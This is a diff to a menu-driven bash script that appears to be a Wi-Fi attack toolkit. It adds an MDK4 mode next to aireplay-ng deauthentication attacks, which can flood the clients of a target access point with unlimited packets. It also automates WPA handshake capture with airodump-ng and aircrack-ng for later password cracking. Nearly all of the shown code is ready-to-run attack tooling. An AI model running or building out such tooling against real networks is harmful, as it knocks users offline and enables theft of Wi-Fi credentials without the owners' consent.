@@ -340,24 +340,51 @@ wifi_deauth () {
          err "Run Target Scan First"
  else
     mon_checker || return 1 #|| means "if the left side fails, do the right side" — so if mon_checker returns 1 (failure), it immediately does return 1 and exits the function.
-    sudo iwconfig $INTERFACE channel $ch
+    sudo iw dev "$INTERFACE" set channel "$ch"
     # xterm=open new terminal,,,-e = to run command in terminal,,,& — run in background so your main script continues;;;; bash — after the command finishes (or errors), drops into a bash shell keeping the window open so you can see the output/error.
     #read -rp expects a string as the prompt, not a command. So you use $() to convert the printf output into a string first.
-    read -rp "$(printf "${MAGENTA}Deauth client  (Enter MAC of client\n\t\tFor all leave empty): ${NC}\t")" cp
-    read -rp "$(printf "${MAGENTA}Deauth Packets Numbers(0 for infinite): ${NC}\t")" pac
-    if [[ -z $pac ]]; then
-        printf "${RED}Number of packets is not selected ${NC}\n"
-        return 1
-    fi
+    
     #-z = zero length (empty)
     #-n = non zero length (has data)
     #rempve bash and exit if any error occur in xterm terminal
     
-    if [[ -z $cp ]]; then
-        xterm -bg black -fg red -title "Deauth Attack" -e "aireplay-ng --deauth $pac -a $ap $INTERFACE --ignore-negative-one; bash, exit" &
-    else
-        xterm -bg black -fg red -title "Deauth Attack" -e "aireplay-ng --deauth $pac -a $ap -c $cp $INTERFACE --ignore-negative-one; bash, exit" &
-    fi
+    while true; do
+		info "-----Make Choice-----"
+		into "1) Aireplay Attack"
+		into "2) MDK4 Attack (No Client Mac Needed)"
+		into "0) Back"
+		
+    
+		read -p ">>	" choice
+		
+		case $choice in 
+		
+			1) read -rp "$(printf "${MAGENTA}Deauth client  (Enter MAC of client\n\t\tFor all leave empty): ${NC}\t")" cp
+				read -rp "$(printf "${MAGENTA}Deauth Packets Numbers(0 for infinite): ${NC}\t")" pac
+				if [[ -z $pac ]]; then
+					printf "${RED}Number of packets is not selected ${NC}\n"
+					continue
+				fi
+				
+				if [[ -z $cp ]]; then
+					xterm -bg black -fg red -title "Deauth Attack" -e "aireplay-ng --deauth $pac -a $ap $INTERFACE --ignore-negative-one; bash, exit" &
+				else
+					xterm -bg black -fg red -title "Deauth Attack" -e "aireplay-ng --deauth $pac -a $ap -c $cp $INTERFACE --ignore-negative-one; bash, exit" &
+				fi
+				;;
+			
+			2)	read -rp "$(printf "${MAGENTA}Deauth duration in seconds: ${NC}\t")" dur
+				xterm -bg black -fg red -title "Deauth Attack" -e "timeout $dur mdk4 $INTERFACE d -B $ap -c $ch; bash, exit" &
+				;;	
+			
+			0) break ;;
+				
+			*) err "Wrong Choice "
+				read -p "Press [Enter] key to continue..." 
+				continue ;;	
+		esac
+    done
+    
  fi
     read -p "Press [Enter] key to continue..."
 }
@@ -380,21 +407,38 @@ wifi_handshake () {
     #-w handshake — save capture to handshake-01.cap,,,--output-format pcap — save as pcap format (needed for cracking later)
     mon_checker || return 1
     read -rp "$(printf "${MAGENTA}Deauth client  (Enter MAC of client or For all leave empty): ${NC}\t")" cp
-    sudo iwconfig $INTERFACE channel $ch
+    sudo iw dev "$INTERFACE" set channel "$ch"
     
     
 
     read -p "Press [Enter] key to continue..."  
+    
+    pp "1) Aireplay"
+    pp "2) MDK4 (Best)"
+    read -rp "$(info "Attack Mode ")" mode
 
+if [[ $mode = 1 ]]; then
     if [[ -z $cp ]]; then
-        xterm -bg black -fg green -title "Handshake Capture" -e "airodump-ng --bssid "$ap" -c "$ch" -w handshake --output-format pcap $INTERFACE; bash" &
-        xterm -bg black -fg red -title "Deauth Attack" -e "aireplay-ng --deauth 0 -a $ap $INTERFACE --ignore-negative-one; bash" &
+        xterm -bg black -fg green -title "Handshake Capture" -e "airodump-ng --bssid $ap -c $ch -w handshake --output-format pcap $INTERFACE & PID=\$!; sleep 40; kill -9 \$PID; bash, exit" &
+        xterm -bg black -fg red -title "Deauth Attack" -e "timeout 25 aireplay-ng --deauth 0 -a $ap $INTERFACE --ignore-negative-one; bash, exit" &
+        
     else
-        xterm -bg black -fg green -title "Handshake Capture" -e "airodump-ng --bssid "$ap" -c "$ch" -w handshake --output-format pcap $INTERFACE; bash" &
-        xterm -bg black -fg red -title "Deauth Attack" -e "aireplay-ng --deauth 0 -a $ap -c $cp $INTERFACE --ignore-negative-one; bash" &
-    fi
+        xterm -bg black -fg green -title "Handshake Capture" -e "airodump-ng --bssid $ap -c $ch -w handshake --output-format pcap $INTERFACE & PID=\$!; sleep 40; kill -9 \$PID; bash, exit" &
+        xterm -bg black -fg red -title "Deauth Attack" -e "timeout 25 aireplay-ng --deauth 0 -a $ap -c $cp $INTERFACE --ignore-negative-one; bash, exit" &
+     fi
+     
+elif [[ $mode = 2 ]]; then
+		xterm -bg black -fg green -title "Handshake Capture" -e "airodump-ng --bssid "$ap" -c "$ch" -w handshake --output-format pcap $INTERFACE  & PID=\$!; sleep 40; kill -9 \$PID; bash, exit" &
+		xterm -bg black -fg red -title "Deauth Attack" -e "timeout 25 mdk4 $INTERFACE d -B $ap -c $ch; bash, exit" &
+
+else 
+	err "Wrong Choice"
+	return 1
+	
+fi
     sleep 2
     read -rp "$(printf "${MAGENTA}Press Enter to verify handshake...${NC}")"
+    
     if 
         aircrack-ng handshake* 2>&1 | grep -q "1 handshake"; then
         printf "${GREEN}Handshake captured successfully!${NC}\n"
@@ -402,8 +446,8 @@ wifi_handshake () {
         printf "${RED}No handshake* found — try again${NC}\n"
         printf "${RED}No Handshake Found Removing File 'handshake-01.cap' ${NC}\n"
         rm handshake*
-    fi
- fi
+	fi
+   fi  
     read -p "Press [Enter] key to continue..."
  #grep -q "1 handshake" — silently checks if the output contains that string, returns true/false.
 
@@ -472,7 +516,7 @@ wifi_menu() {
         printf "${DIM}══════════════════════════════════════════════════════${NC}\n"
 
         printf "${GREEN}4.☠️ Deauth Attack ${NC}\n"
-        printf "${GREEN}5.🫱🏻‍🫲🏿 HandShake Capture ${NC}\n"
+        printf "${GREEN}5.🫱🏻‍🫲🏿 HandShake Capture (Wait 1 min) ${NC}\n"
         printf "${GREEN}6.🫣 PMKID Capture ${NC}\n"
 
         printf "${DIM}══════════════════════════════════════════════════════${NC}\n"
